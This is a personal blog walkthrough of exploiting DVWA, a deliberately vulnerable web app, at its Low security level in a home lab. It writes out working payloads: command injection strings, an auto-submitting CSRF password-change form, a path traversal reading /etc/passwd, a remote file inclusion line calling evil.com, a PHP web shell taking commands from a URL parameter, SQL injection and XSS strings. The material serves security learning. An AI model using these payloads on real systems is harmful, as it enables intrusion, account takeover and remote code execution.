---
title: "DVWA walkthrough Level LOW"
date: 2025-01-12 12:00:00 +0300
categories: [Security Testing, DVWA]
---
## Introduction

**Damn Vulnerable Web Application (DVWA)** is a deliberately insecure web app that helps security enthusiasts practice their skills in a controlled environment. It includes common web vulnerabilities—such as SQL Injection, Command Injection, Cross-Site Scripting, and more—each with escalating levels of difficulty (Low, Medium, High, and sometimes Impossible).

In this blog I will be walking through **most** available vulnerabilities at the **Low** security level. I’ll cover the typical exploitation techniques and share the thought process.

---

## Environment Setup with Docker

For this I opted to use portainer.io , I deployed a new container using the DVWA (vulnerables/web-dvwa) image and set up the network to be	vlan2424-subnet, that way the container will be assigned an IP under VLAN 2424. This will come in handy later when using tools like burpsuite, nessus...


### Accessing DVWA

- Open `http://192.168.60.128`
- The DVWA login page is loaded.  
- Default credentials:
  - **Username**: `admin`
  - **Password**: `password`

---

## Configuring DVWA Security Level

1. Under **"DVWA Security"**.
2. From the dropdown menu, I chose  **"Low"**.
3. **"Submit"**.

---

## Vulnerabilities Walkthrough (Low Security)

In the left-hand menu, there are several vulnerability categories. I'll address each from top to bottom, focusing on how to exploit them at **Low** level.

---

### 1. Brute Force


**What is it?**  
This page is a simple login form that does not enforce any rate-limiting or account-lockout mechanisms at the **Low** level.

#### Exploitation Steps

**Manual Attempt**  
   - The known valid username/password combination for DVWA is `admin` / `password`.
   - If I enter `admin` / `password` directly, I'll see the "Welcome to the password protected area admin" message.

> At the low level I did not use any tools, this will be tackled when going through higher levels
{: .prompt-info }

![brute force example](/assets/img/Home%20Lab/DVWA/DVWA%20Low/bruite-force-dvwa.png)

**Thought Process**  
- No lockouts or CAPTCHA means an attacker can guess passwords infinitely.
- The easiest approach is to try known default credentials or guess common passwords if a default setup is suspected.

---

### 2. Command Injection

**What is it?**  
Command Injection occurs when user input is injected directly into a system-level command without proper sanitization.

#### Exploitation Steps

1. **Basic Functionality**  
   - The form prompts for an IP address to "ping". If I enter `127.0.0.1`, I'll see a normal ping result.

2. **Proof of Concept**  
   - At **Low** level, there’s no validation. I can append commands using `;`, `&&`, or `|`.
   - Try:
     ```bash
     127.0.0.1; whoami
     ```
   - 

3. **Escalate**  
   - I can chain multiple commands:
     ```bash
     127.0.0.1; ls -lrth
     ```

![command injection example](/assets/img/Home%20Lab/DVWA/DVWA%20Low/ci-dvwa.png)

**Thought Process**  
- Look for user-supplied input that ends up in a shell command.
- Test with standard command separators.
- Confirm execution by looking for command output on the web page.

---

### 3. Cross-Site Request Forgery (CSRF)

**What is it?**  
CSRF forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. At **Low** level, the anti-CSRF tokens are either absent or not enforced.

#### Exploitation Steps

1. **Change User Password**  
   - The CSRF page typically lets us change the user’s password without any checks.
   - If I capture that request in something like Burp Suite, I'll see no token or a non-validated token at **Low** level.

2. **Craft a Malicious Form**  
   - In real scenarios, I could craft an HTML form that auto-submits to the `CSRF` endpoint, changing the victim’s password. Example:
     ```html
     <html>
       <body onload="document.forms[0].submit()">
         <form action="http://192.168.60.128/vulnerabilities/csrf/?" method="POST">
           <input type="hidden" name="password_new" value="hacked" />
           <input type="hidden" name="password_conf" value="hacked" />
           <input type="hidden" name="Change" value="Change" />
         </form>
       </body>
     </html>
     ```
   - If the victim is logged in and visits the malicious page, their password is changed without confirmation.

**Thought Process**  
- At **Low** security, DVWA doesn’t require or verify a CSRF token, meaning any request can be submitted from anywhere.
- To confirm it’s vulnerable, I can just replicate the request in my browser or a different tab, and watch it succeed without a valid token.

---

### 4. File Inclusion

**What is it?**  
File Inclusion vulnerabilities happen when a web application includes or displays files based on user input. Typically, this is either a **Local File Inclusion (LFI)** or **Remote File Inclusion (RFI)**.

#### Exploitation Steps

1. **Basic Navigation**  
   - The page lets me select or provide a filename parameter like `?page=include.php`.
   - At **Low** level, it does not sanitize the `page` parameter. The server allows local file paths, I could do:
     ```bash
        http://192.168.60.128/vulnerabilities/fi/?page=../../../../../etc/passwd
     ```
   - 

![basic File Inclusion example](/assets/img/Home%20Lab/DVWA/DVWA%20Low/fi-dvwa-low.png)

2. **Remote File Inclusion**  
   - If `allow_url_include` is enabled (it is not in our case), I could do something like:
     ```bash
     ?page=http://evil.com/shell.txt
     ```
   - The server might parse my remote malicious file as PHP, leading to remote code execution.

**Thought Process**  
- Check if the parameter is a file path that I can manipulate.
- Try common local system files (`/etc/passwd`, `C:\boot.ini` on Windows).
- If remote inclusion is possible, host a malicious script and reference it.

---

### 5. File Upload

**Location**: `File Upload` in the left menu.

**What is it?**  
Allows I to upload files. At **Low** level, DVWA often doesn’t check the file extension or content type, enabling I to upload **.php** shells or other malicious files.

#### Exploitation Steps

1. **Create a Simple PHP Shell**  
   ```php
   <?php
   echo "Shell is live! I Have Successfully set up a shell";
   system($_GET['cmd']);
   ?>
   ```
   Save it as `shell.php`.

2. **Upload**  
   - Go to the **File Upload** page, click **Choose File**, select `test.php`, then **Upload**.
   - If successful, DVWA will tell I where the file is uploaded, e.g.:  
     `http://192.168.60.128/hackable/uploads/test.php`

![upload example](/assets/img/Home%20Lab/DVWA/DVWA%20Low/file-upload-dvwa-low.png)

3. **Test the Shell**  
   - Visit:
     ```
     http://192.168.60.128/hackable/uploads/test.php?cmd=echo%20"I%20have%20successfully%20set%20up%20a%20shell"
     ```
   - 

![shell output example](/assets/img/Home%20Lab/DVWA/DVWA%20Low/shelloutput-dvwa.png)

**Thought Process**  
- At **Low** level, DVWA doesn’t prevent `.php` uploads or sanitize the file name.
- The goal is to confirm the file is executed by the server rather than just stored.

---

### 6. Insecure CAPTCHA

**Location**: `Insecure CAPTCHA` in the left menu.

**What is it?**  
A CAPTCHA is intended to prevent automated form submissions. At **Low** level in DVWA, the CAPTCHA may be static or easily bypassed.

#### Exploitation Steps

1. **Inspect the Source**  
   - I may notice the CAPTCHA is always the same or coded in the source. For instance, it might be hard-coded as `ABC123`.
2. **Automate**  
   - Because it doesn’t actually check the input robustly, I can script repeated attempts ignoring the CAPTCHA or sending the expected static value each time.

**Thought Process**  
- A real CAPTCHA would dynamically generate challenges. At **Low**, it might be easily guessable or disabled.
- Checking the page’s HTML source or a quick guess might bypass it.

---

### 7. SQL Injection

**Location**: `SQL Injection` in the left menu.

**What is it?**  
SQL Injection allows an attacker to manipulate the underlying SQL query by injecting malicious statements through input.

#### Exploitation Steps

1. **Find the Injection Point**  
   - The page typically asks for a `User ID`.

2. **Basic Injection Test**  
   - Enter:
     ```sql
     1' or '1'='1
     ```
   - If the response shows **all** users in the database, the injection worked.

![SQLI example](/assets/img/Home%20Lab/DVWA/DVWA%20Low/sqli-dvwa-low.png)

3. **Union Attacks and Further Enumeration**  
   - With a blind approach or more advanced injection, I can glean table names, columns, etc.
   - But at **Low**, a simple `' or '1'='1` confirms it quickly.

**Thought Process**  
- **Low** level typically means no parameterization or input sanitization.
- Testing common injection strings easily reveals vulnerability.

---

### 8. Blind SQL Injection

**Location**: `Blind SQL Injection` in the left menu.

**What is it?**  
Similar to SQL Injection, but I might not get direct output. Instead, I rely on side effects or boolean responses.

#### Exploitation Steps

1. **Yes/No Responses**  
   - The page might return different messages ("User ID exists" vs. "User ID not found").
   - I can test:
     ```sql
     1' AND '1'='1
     ```
     vs.
     ```sql
     1' AND '1'='2
     ```
   - If the response differs, the injection is working.

2. **Extract Data Bit-by-Bit**  
   - In advanced scenarios, I could systematically guess table names, columns, etc. using time-based or boolean checks. But at **Low**, typically the messages are distinct enough to glean a quick result.

**Thought Process**  
- Blind means the output isn’t directly displayed, so I rely on changes in the page’s behavior.
- Start with simple boolean tests to confirm vulnerability.

---

### 9. XSS (Reflected)

**Location**: `XSS (Reflected)` in the left menu.

**What is it?**  
Reflected XSS occurs when user input is immediately returned to the browser in the server’s response without sanitization.

#### Exploitation Steps

1. **Inject JavaScript**  
   - Type:
     ```html
     <script>alert('XSS');</script>
     ```
   - Hit "Submit".

2. **Observe**  
   
![XSS example](/assets/img/Home%20Lab/DVWA/DVWA%20Low/Xss-output-dvwa-low.png)

**Thought Process**  
- At **Low** level, there is no filtering or encoding.
- Try a simple `<script>` tag to confirm it.

---

### 10. XSS (Stored)

**Location**: `XSS (Stored)` in the left menu.

**What is it?**  
Stored XSS (also known as Persistent XSS) involves injecting code that gets saved on the server and viewed by other users.

#### Exploitation Steps

1. **Post a Malicious Comment**  
   - I'll see a comment form or similar. Enter:
     ```html
     <script>alert('Stored XSS');</script>
     ```
   - Submit it.
   In this case it is a E-GuestBook where I can sign It And see the other people's Signatures.

![stored XSS before](/assets/img/Home%20Lab/DVWA/DVWA%20Low/StoredXssBefore.png)
![stored XSS after](/assets/img/Home%20Lab/DVWA/DVWA%20Low/StoredXssAfter.png)


2. **Reload the Page**  
   - ![stored XSS](/assets/img/Home%20Lab/DVWA/DVWA%20Low/StoredXss.png)

3. **More Advanced Payloads**  
   - In real scenarios, I might steal cookies or session tokens, but in DVWA at **Low**, a simple script tag suffices to prove the concept.

**Thought Process**  
- The user’s input is stored in a database or file and re-displayed to all visitors.
- Minimal or no sanitization ensures the malicious script stays in the system.

---

### 11. XSS (DOM-Based)

**Location**: `XSS (DOM)` in the left menu.

**What is it?**  
DOM-Based XSS occurs in the browser’s Document Object Model rather than on the server. The malicious payload is processed by client-side JavaScript.

#### Exploitation Steps

1. **Observation**  
   - When selecting an item from the dropdown and pressing select, we can clearly see that the selection is being passed to the URL

![Dom XSS before](/assets/img/Home%20Lab/DVWA/DVWA%20Low/XssDomBefore.png)

2. **Inject into the URL**  
   - A typical test could be something like:
     ```
     http://192.168.60.128/vulnerabilities/xss_d/?default=<script>alert("DOM XSS")</script>
     ```
3. **Observe**  
   - ![Dom XSS After](/assets/img/Home%20Lab/DVWA/DVWA%20Low/XssDomAfter.png)

**Thought Process**  
- No server-side protection means the client-side script is directly inserting your payload.
- Tinkering with URL parameters or fragment identifiers can trigger DOM-based XSS.

---

## Summary and Next Steps

**Key Lessons**  
- At **Low** security, DVWA’s vulnerabilities are very apparent: little to no sanitization or validation.  
- This level is a perfect start to understand the **fundamentals** of how these attacks work.  

**What to Do Next**  
1. **Practice at Medium/High**  
   - Increase DVWA’s security level to **Medium** or **High**. Notice how improved input validation or security tokens affect attacks.
2. **Use Automation Tools**  
   - Tools like **Burp Suite**, **OWASP ZAP**, and **sqlmap** can speed up testing and help discover hidden issues.


---

_This post is part of Jad's Cybersecurity Blog._
